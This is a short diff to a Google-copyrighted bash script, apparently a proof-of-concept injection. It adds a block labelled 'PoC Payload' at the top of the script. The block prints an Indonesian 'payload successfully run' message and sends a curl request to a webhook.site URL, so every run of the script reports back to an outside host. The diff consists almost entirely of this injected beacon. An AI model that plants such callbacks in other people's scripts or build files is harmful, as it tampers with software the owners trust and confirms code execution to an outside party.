@@ -1,4 +1,8 @@
 #!/bin/bash
+# === BEGIN PoC Payload ===
+echo "[🔥 PAYLOAD BERHASIL DIJALANKAN 🔥]"
+curl -X GET https://webhook.site/98022250-3ae1-467b-a99b-f1b16cfe6b65
+# === END PoC Payload ===
 # Copyright 2022 Google LLC
 #
 # Licensed under the Apache License, Version 2.0 (the "License");
